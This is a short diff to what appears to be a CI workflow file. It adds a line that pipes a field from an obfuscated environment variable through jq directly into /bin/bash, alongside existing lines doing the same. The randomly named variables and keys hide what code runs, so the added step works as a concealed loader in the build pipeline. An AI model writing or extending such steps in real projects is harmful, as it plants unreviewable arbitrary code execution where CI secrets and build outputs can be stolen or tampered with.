@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$dwksa01343" | jq -r .ivh22 | /bin/bash
           printf '%s' "$s8" | jq -r .sy35818 | /bin/bash
           printf '%s' "$il91" | jq -r .ea6 | /bin/bash
+          echo $evnnq45732 | jq -r .l766 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
